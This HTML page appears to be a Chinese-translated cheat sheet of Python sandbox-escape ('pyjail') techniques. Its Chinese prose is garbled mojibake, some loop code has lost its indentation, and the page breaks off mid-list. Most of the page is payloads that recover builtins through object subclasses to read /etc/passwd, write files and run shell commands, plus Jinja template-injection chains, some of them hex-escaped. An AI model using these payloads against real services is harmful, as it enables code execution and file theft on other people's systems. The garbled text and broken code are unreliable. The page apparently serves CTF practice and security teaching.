<p>åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œä½ å¯ä»¥è§‚å¯Ÿåˆ°å¦‚ä½• <strong>æ»¥ç”¨</strong> ä¸€äº›åŠ è½½çš„ "<strong>æ— å®³</strong>" æ¨¡å—ï¼Œä»¥ <strong>è®¿é—®</strong> <strong>å±é™©</strong> <strong>åŠŸèƒ½</strong>ã€‚</p>
<p><strong>Python2</strong></p>
<pre><code class="language-python">#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering &lt;type 'file'&gt; in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering &lt;type 'file'&gt; in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is &lt;class 'warnings.catch_warnings'&gt;)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is &lt;class 'warnings.catch_warnings'&gt;)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
</code></pre>
<h4 id="python3"><a class="header" href="#python3">Python3</a></h4>
<pre><code class="language-python"># Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
print.__self__
dir.__self__
globals.__self__
len.__self__
__build_class__.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
</code></pre>
<p><a href="./#recursive-search-of-builtins-globals"><strong>ä¸‹é¢æœ‰ä¸€ä¸ªæ›´å¤§çš„å‡½æ•°</strong></a> ç”¨äºæŸ¥æ‰¾æ•°å/<strong>æ•°ç™¾</strong>ä¸ª <strong>åœ°æ–¹</strong>ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ° <strong>å†…ç½®å‡½æ•°</strong>ã€‚</p>
<h4 id="python2-å’Œ-python3"><a class="header" href="#python2-å’Œ-python3">Python2 å’Œ Python3</a></h4>
<pre><code class="language-python"># Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
</code></pre>
<h3 id="å†…ç½®æœ‰æ•ˆè½½è·"><a class="header" href="#å†…ç½®æœ‰æ•ˆè½½è·">å†…ç½®æœ‰æ•ˆè½½è·</a></h3>
<pre><code class="language-python"># Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
</code></pre>
<h2 id="globals-and-locals"><a class="header" href="#globals-and-locals">Globals and locals</a></h2>
<p>æ£€æŸ¥ <strong><code>globals</code></strong> å’Œ <strong><code>locals</code></strong> æ˜¯äº†è§£æ‚¨å¯ä»¥è®¿é—®çš„å†…å®¹çš„å¥½æ–¹æ³•ã€‚</p>
<pre><code class="language-python">&gt;&gt;&gt; globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': None, '__annotations__': {}, '__builtins__': &lt;module 'builtins' (built-in)&gt;, 'attr': &lt;module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'&gt;, 'a': &lt;class 'importlib.abc.Finder'&gt;, 'b': &lt;class 'importlib.abc.MetaPathFinder'&gt;, 'c': &lt;class 'str'&gt;, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', &lt;class 'DeprecationWarning'&gt;, 1): True}, 'z': &lt;class 'str'&gt;}
&gt;&gt;&gt; locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': None, '__annotations__': {}, '__builtins__': &lt;module 'builtins' (built-in)&gt;, 'attr': &lt;module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'&gt;, 'a': &lt;class 'importlib.abc.Finder'&gt;, 'b': &lt;class 'importlib.abc.MetaPathFinder'&gt;, 'c': &lt;class 'str'&gt;, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', &lt;class 'DeprecationWarning'&gt;, 1): True}, 'z': &lt;class 'str'&gt;}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[&lt;class 'function'&gt;]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[&lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class 'zipimport.zipimporter'&gt;, &lt;class 'zipimport._ZipImportResourceReader'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class 'types.DynamicClassAttribute'&gt;, &lt;class 'types._GeneratorWrapper'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class 'reprlib.Repr'&gt;, &lt;class 'functools.partialmethod'&gt;, &lt;class 'functools.singledispatchmethod'&gt;, &lt;class 'functools.cached_property'&gt;, &lt;class 'contextlib._GeneratorContextManagerBase'&gt;, &lt;class 'contextlib._BaseExitStack'&gt;, &lt;class 'sre_parse.State'&gt;, &lt;class 'sre_parse.SubPattern'&gt;, &lt;class 'sre_parse.Tokenizer'&gt;, &lt;class 're.Scanner'&gt;, &lt;class 'rlcompleter.Completer'&gt;, &lt;class 'dis.Bytecode'&gt;, &lt;class 'string.Template'&gt;, &lt;class 'cmd.Cmd'&gt;, &lt;class 'tokenize.Untokenizer'&gt;, &lt;class 'inspect.BlockFinder'&gt;, &lt;class 'inspect.Parameter'&gt;, &lt;class 'inspect.BoundArguments'&gt;, &lt;class 'inspect.Signature'&gt;, &lt;class 'bdb.Bdb'&gt;, &lt;class 'bdb.Breakpoint'&gt;, &lt;class 'traceback.FrameSummary'&gt;, &lt;class 'traceback.TracebackException'&gt;, &lt;class '__future__._Feature'&gt;, &lt;class 'codeop.Compile'&gt;, &lt;class 'codeop.CommandCompiler'&gt;, &lt;class 'code.InteractiveInterpreter'&gt;, &lt;class 'pprint._safe_key'&gt;, &lt;class 'pprint.PrettyPrinter'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class 'threading._RLock'&gt;, &lt;class 'threading.Condition'&gt;, &lt;class 'threading.Semaphore'&gt;, &lt;class 'threading.Event'&gt;, &lt;class 'threading.Barrier'&gt;, &lt;class 'threading.Thread'&gt;, &lt;class 'subprocess.CompletedProcess'&gt;, &lt;class 'subprocess.Popen'&gt;]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[&lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class 'zipimport.zipimporter'&gt;, &lt;class 'zipimport._ZipImportResourceReader'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class 'types.DynamicClassAttribute'&gt;, &lt;class 'types._GeneratorWrapper'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class 'reprlib.Repr'&gt;, &lt;class 'functools.partialmethod'&gt;, &lt;class 'functools.singledispatchmethod'&gt;, &lt;class 'functools.cached_property'&gt;, &lt;class 'contextlib._GeneratorContextManagerBase'&gt;, &lt;class 'contextlib._BaseExitStack'&gt;, &lt;class 'sre_parse.State'&gt;, &lt;class 'sre_parse.SubPattern'&gt;, &lt;class 'sre_parse.Tokenizer'&gt;, &lt;class 're.Scanner'&gt;, &lt;class 'rlcompleter.Completer'&gt;, &lt;class 'dis.Bytecode'&gt;, &lt;class 'string.Template'&gt;, &lt;class 'cmd.Cmd'&gt;, &lt;class 'tokenize.Untokenizer'&gt;, &lt;class 'inspect.BlockFinder'&gt;, &lt;class 'inspect.Parameter'&gt;, &lt;class 'inspect.BoundArguments'&gt;, &lt;class 'inspect.Signature'&gt;, &lt;class 'bdb.Bdb'&gt;, &lt;class 'bdb.Breakpoint'&gt;, &lt;class 'traceback.FrameSummary'&gt;, &lt;class 'traceback.TracebackException'&gt;, &lt;class '__future__._Feature'&gt;, &lt;class 'codeop.Compile'&gt;, &lt;class 'codeop.CommandCompiler'&gt;, &lt;class 'code.InteractiveInterpreter'&gt;, &lt;class 'pprint._safe_key'&gt;, &lt;class 'pprint.PrettyPrinter'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class 'threading._RLock'&gt;, &lt;class 'threading.Condition'&gt;, &lt;class 'threading.Semaphore'&gt;, &lt;class 'threading.Event'&gt;, &lt;class 'threading.Barrier'&gt;, &lt;class 'threading.Thread'&gt;, &lt;class 'subprocess.CompletedProcess'&gt;, &lt;class 'subprocess.Popen'&gt;]
</code></pre>
<p><a href="./#recursive-search-of-builtins-globals"><strong>ä¸‹é¢æœ‰ä¸€ä¸ªæ›´å¤§çš„å‡½æ•°</strong></a> ç”¨äºæŸ¥æ‰¾æ•°å/<strong>æ•°ç™¾</strong>ä¸ª <strong>ä½ç½®</strong>ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ° <strong>globals</strong>ã€‚</p>
<h2 id="å‘ç°ä»»æ„æ‰§è¡Œ"><a class="header" href="#å‘ç°ä»»æ„æ‰§è¡Œ">å‘ç°ä»»æ„æ‰§è¡Œ</a></h2>
<p>åœ¨è¿™é‡Œï¼Œæˆ‘æƒ³è§£é‡Šå¦‚ä½•è½»æ¾å‘ç° <strong>æ›´å±é™©çš„åŠŸèƒ½</strong> å¹¶æå‡ºæ›´å¯é çš„åˆ©ç”¨æ–¹æ³•ã€‚</p>
<h4 id="é€šè¿‡ç»•è¿‡è®¿é—®å­ç±»"><a class="header" href="#é€šè¿‡ç»•è¿‡è®¿é—®å­ç±»">é€šè¿‡ç»•è¿‡è®¿é—®å­ç±»</a></h4>
<p>æ­¤æŠ€æœ¯æœ€æ•æ„Ÿçš„éƒ¨åˆ†ä¹‹ä¸€æ˜¯èƒ½å¤Ÿ <strong>è®¿é—®åŸºç±»å­ç±»</strong>ã€‚åœ¨ä¹‹å‰çš„ç¤ºä¾‹ä¸­ï¼Œè¿™æ˜¯é€šè¿‡ <code>''.__class__.__base__.__subclasses__()</code> å®Œæˆçš„ï¼Œä½†è¿˜æœ‰ <strong>å…¶ä»–å¯èƒ½çš„æ–¹æ³•</strong>ï¼š</p>
<pre><code class="language-python">#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

# This can be useful in case it is not possible to make calls (therefore using decorators)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
</code></pre>
<h3 id="æŸ¥æ‰¾åŠ è½½çš„å±é™©åº“"><a class="header" href="#æŸ¥æ‰¾åŠ è½½çš„å±é™©åº“">æŸ¥æ‰¾åŠ è½½çš„å±é™©åº“</a></h3>
<p>ä¾‹å¦‚ï¼ŒçŸ¥é“ä½¿ç”¨åº“ <strong><code>sys</code></strong> å¯ä»¥ <strong>å¯¼å…¥ä»»æ„åº“</strong>ï¼Œä½ å¯ä»¥æœç´¢æ‰€æœ‰ <strong>åŠ è½½çš„æ¨¡å—ä¸­åŒ…å«å¯¼å…¥ sys çš„æ¨¡å—</strong>ï¼š</p>
<pre><code class="language-python">[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
</code></pre>
<p>æœ‰å¾ˆå¤šï¼Œ<strong>æˆ‘ä»¬åªéœ€è¦ä¸€ä¸ª</strong>æ¥æ‰§è¡Œå‘½ä»¤ï¼š</p>
<pre><code class="language-python">[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
</code></pre>
<p>æˆ‘ä»¬å¯ä»¥å¯¹æˆ‘ä»¬çŸ¥é“å¯ä»¥ç”¨æ¥<strong>æ‰§è¡Œå‘½ä»¤</strong>çš„<strong>å…¶ä»–åº“</strong>åšåŒæ ·çš„äº‹æƒ…ï¼š</p>
<pre><code class="language-python">#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
</code></pre>
<p>æ­¤å¤–ï¼Œæˆ‘ä»¬ç”šè‡³å¯ä»¥æœç´¢å“ªäº›æ¨¡å—æ­£åœ¨åŠ è½½æ¶æ„åº“ï¼š</p>
<pre><code class="language-python">bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
</code></pre>
<p>æ­¤å¤–ï¼Œå¦‚æœæ‚¨è®¤ä¸º<strong>å…¶ä»–åº“</strong>å¯èƒ½èƒ½å¤Ÿ<strong>è°ƒç”¨å‡½æ•°ä»¥æ‰§è¡Œå‘½ä»¤</strong>ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥<strong>é€šè¿‡å‡½æ•°åç§°è¿‡æ»¤</strong>å¯èƒ½çš„åº“ï¼š</p>
<pre><code class="language-python">bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, 